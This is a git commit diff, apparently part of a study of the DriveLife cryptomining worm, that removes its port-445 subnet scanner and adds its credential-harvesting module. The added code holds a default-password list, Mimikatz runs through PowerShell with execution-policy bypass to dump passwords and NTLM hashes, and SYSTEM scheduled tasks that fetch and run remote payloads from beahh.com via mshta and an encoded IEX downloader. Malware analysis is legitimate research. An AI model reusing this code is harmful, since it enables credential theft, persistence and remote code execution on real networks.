ca4c5d9f8e6cb372b9c163dc4cfa8aca6d6046e6
freedom-wy <dazhuang_python@sina.com>
2023-09-07 13:56:50 +0800

    分析python程序

--- 驱动人生挖矿/sub_command.py
+++ 驱动人生挖矿/sub_command.py
@@ -1,116 +1,3 @@
-import subprocess
-import re
-from urllib2 import urlopen
-from json import load
-import socket
-import struct
-import random
-
-
-
-
-iplist = ['192.168.0.1/24',
- '192.168.1.1/24',
- '192.168.2.1/24',
- '192.168.3.1/24',
- '192.168.4.1/24',
- '192.168.5.1/24',
- '192.168.6.1/24',
- '192.168.7.1/24',
- '192.168.8.1/24',
- '192.168.9.1/24',
- '192.168.10.1/24',
- '192.168.18.1/24',
- '192.168.31.1/24',
- '192.168.199.1/24',
- '192.168.254.1/24',
- '192.168.67.1/24',
- '10.0.0.1/24',
- '10.0.1.1/24',
- '10.0.2.1/24',
- '10.1.1.1/24',
- '10.90.90.1/24',
- '10.1.10.1/24',
- '10.10.1.1/24']
-
-def find_ip():
-    global iplist2
-    ipconfig_process = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)
-    output = ipconfig_process.stdout.read()
-    result = re.findall('\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', output)
-    for ipaddr in result:
-        if ipaddr != '127.0.0.1' and ipaddr != '255.255.255.0' and ipaddr != '0.0.0.0':
-            ipaddr = ipaddr.split('.')[0] + '.' + ipaddr.split('.')[1] + '.' + ipaddr.split('.')[2] + '.1/24'
-            iplist.append(ipaddr)
-
-    netstat_process = subprocess.Popen('netstat -na', stdout=subprocess.PIPE)
-    output2 = netstat_process.stdout.read()
-    result2 = re.findall('\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', output2)
-    for ip in result2:
-        if ip != '127.0.0.1' and ip != '0.0.0.0' and ip != '255.255.0.0' and ip != '1.1.1.1':
-            ip = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.1/24'
-            iplist.append(ip)
-
-    try:
-        ipp1 = urlopen('http://ip.42.pl/raw', timeout=3).read()
-        ipp1 = ipp1.split('.')[0] + '.' + ipp1.split('.')[1] + '.' + ipp1.split('.')[2] + '.1/24'
-        ipp2 = load(urlopen('http://jsonip.com', timeout=3))['ip']
-        ipp2 = ipp2.split('.')[0] + '.' + ipp2.split('.')[1] + '.' + ipp2.split('.')[2] + '.1/24'
-        iplist.append(ipp1)
-        iplist.append(ipp2)
-    except:
-        pass
-
-    iplist2 = list(set(iplist))
-    iplist2.sort(key=iplist.index)
-    return iplist2
-
-nip = []
-def xip(numb=500):
-    del nip[:]
-    for n in xrange(numb):
-        ipp = socket.inet_ntoa(struct.pack('>I', random.randint(1, 4294967295L)))
-        ipp = ipp.split('.')[0] + '.' + ipp.split('.')[1] + '.' + ipp.split('.')[2] + '.1/24'
-        nip.append(ipp)
-
-    return nip
-
-# for s in xip(500):
-#     if s.split('.')[0].strip() == '127':
-#         continue
-#     if s.split('.')[0].strip() == '10':
-#         continue
-#     if s.split('.')[0].strip() == '0':
-#         continue
-#     if s.split('.')[0].strip() == '100':
-#         continue
-#     if s.split('.')[0].strip() == '172':
-#         continue
-#     if int(s.split('.')[0].strip()) in xrange(224, 256):
-#         continue
-#     # print(s)
-#     ip, cidr = s.split('/')
-#     cidr = int(cidr)
-#     host_bits = 32 - cidr
-#     i = struct.unpack('>I', socket.inet_aton(ip))[0]
-#     start = i >> host_bits << host_bits
-#     end = i | (1 << host_bits) - 1
-#     for i in range(start + 1, end):
-#         # semaphore1.acquire()
-#         ip = socket.inet_ntoa(struct.pack('>I', i))
-#         print(ip)
-#         # t1 = threading.Thread(target=scansmb2, args=(ip, 445))
-#         # t1.start()
-
-def scan2(ip, p):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(float(2))
-    try:
-        s.connect((ip, p))
-        return 1
-    except Exception as e:
-        return 0
-
 # ee2 = 'c:\\windows\\temp\\svvhost.exe', ee2 = 'c:\\windows\\temp\\svchost.exe'
 # dl = 'c:\\windows\\system32\\svhost.exe'
 # dl = 'c:\\windows\\SysWOW64\\svhost.exe'
@@ -123,9 +10,190 @@ def scan2(ip, p):
 # tr计划任务要执行的可执行程序
 # 解密base64 IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN) 
 # 在微步沙箱中下载样本
-PSEXEC(ee2, dl, 'cmd.exe /c schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F&&c:\\windows\\temp\\svchost.exe', u, p, d, fr).run(ip):
+
+import os
+import subprocess
+import time
+
+mkatz = "abc"
+ntlist = []
+userlist2 = ['', 'Administrator', 'admin']
+domainlist = ['']
+passlist = ['',
+ '123456',
+ 'password',
+ 'qwerty',
+ '12345678',
+ '123456789',
+ '123',
+ '1234',
+ '123123',
+ '12345',
+ '12345678',
+ '123123123',
+ '1234567890',
+ '88888888',
+ '111111111',
+ '000000',
+ '111111',
+ '112233',
+ '123321',
+ '654321',
+ '666666',
+ '888888',
+ 'a123456',
+ '123456a',
+ '5201314',
+ '1qaz2wsx',
+ '1q2w3e4r',
+ 'qwe123',
+ '123qwe',
+ 'a123456789',
+ '123456789a',
+ 'baseball',
+ 'dragon',
+ 'football',
+ 'iloveyou',
+ 'password',
+ 'sunshine',
+ 'princess',
+ 'welcome',
+ 'abc123',
+ 'monkey',
+ '!@#$%^&*',
+ 'charlie',
+ 'aa123456',
+ 'Aa123456',
+ 'admin',
+ 'homelesspa',
+ 'password1',
+ '1q2w3e4r5t',
+ 'qwertyuiop',
+ '1qaz2wsx']
 
 
-if __name__ == "__main__":
-    value = scan2("127.0.0.1", 445)
-    print(value)
+def mmka():
+    global userlist2
+    global domainlist
+    global passlist
+    if os.path.exists('C:\\windows\\system32\\WindowsPowerShell\\'):
+        if os.path.exists('c:/windows/temp/m.ps1'):
+            if os.path.exists('c:/windows/temp/mkatz.ini'):
+                print('mkatz.ini exist')
+                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
+                mnow = int(time.time())
+                if (mnow - mtime) / 60 / 60 < 24:
+                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
+                else:
+                    print('reload mimi')
+                    if 'PROGRAMFILES(X86)' in os.environ:
+                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                    else:
+                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                    musr = usr.stdout.read()
+                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
+                    fmk.write(musr)
+                    fmk.close()
+            else:
+                print('reload mimi')
+                if 'PROGRAMFILES(X86)' in os.environ:
+                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                else:
+                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                musr = usr.stdout.read()
+                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
+                fmk.write(musr)
+                fmk.close()
+        else:
+            fm = open('c:\\windows\\temp\\m.ps1', 'w')
+            fm.write(mkatz)
+            fm.close()
+            if os.path.exists('c:/windows/temp/mkatz.ini'):
+                print('mkatz.ini exist')
+                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
+                mnow = int(time.time())
+                if (mnow - mtime) / 60 / 60 < 24:
+                    print('reload mimi')
+                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
+                else:
+                    print('reload mimi')
+                    if 'PROGRAMFILES(X86)' in os.environ:
+                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                    else:
+                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                    musr = usr.stdout.read()
+                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
+                    fmk.write(musr)
+                    fmk.close()
+            else:
+                print('reload mimi')
+                if 'PROGRAMFILES(X86)' in os.environ:
+                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                else:
+                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
+                musr = usr.stdout.read()
+                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
+                fmk.write(musr)
+                fmk.close()
+    else:
+        usr3 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autocheck /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmd.exe /c mshta http://w.beahh.com/page.html?p%COMPUTERNAME%"&schtasks /run /TN Autocheck)', stdout=subprocess.PIPE)
+        usr4 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autoscan /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autoscan /tr "C:\\Windows\\temp\\svchost.exe"&schtasks /run /TN Autoscan)', stdout=subprocess.PIPE)
+    print('mimi over')
+    usern = ''
+    lmhash = ''
+    nthash = ''
+    tspkg = ''
+    wdigest = ''
+    kerberos = ''
+    domain = ''
+    usernull = ''
+    try:
+        dousr = subprocess.Popen('cmd /c wmic ntdomain get domainname', stdout=subprocess.PIPE)
+        domianusr = dousr.stdout.read()
+        dousr = subprocess.Popen('cmd /c net user', stdout=subprocess.PIPE)
+        luser = dousr.stdout.read().split('\r\n')[:-3]
+        for c in luser:
+            if '-' in c:
+                continue
+            for j in c.split(' '):
+                if '' == j:
+                    continue
+                if 'Guest' == j:
+                    continue
+                userlist2.append(j.strip())
+
+        if '* LM' in musr:
+            mmlist = musr.split('* LM')
+            del mmlist[0]
+            for i in mmlist:
+                domaint = i.split('Domain   :')[1].split('\n')[0].strip()
+                if domaint in domianusr:
+                    domainlist.append(domaint)
+                for ii in i.split('Authentication')[0].split('Username :')[1:]:
+                    unt = ii.split('\n')[0].strip()
+                    userlist2.append(unt)
+
+                for ii in i.split('Authentication')[0].split('Password :')[1:]:
+                    pwdt = ii.split('\n')[0].strip()
+                    if pwdt != '(null)':
+                        passlist.append(pwdt)
+
+                passlist = list(set(passlist))
+                userlist2 = list(set(userlist2))
+                domainlist = list(set(domainlist))
+
+        else:
+            print('nobody logon')
+        if '* NTLM' in musr:
+            mmlist = musr.split('* NTLM')
+            del mmlist[0]
+            for i in mmlist:
+                NThash = i.split(':')[1].split('\n')[0].strip()
+                ntlist.append(NThash)
+
+    except:
+        print('except')
+
+
+
+
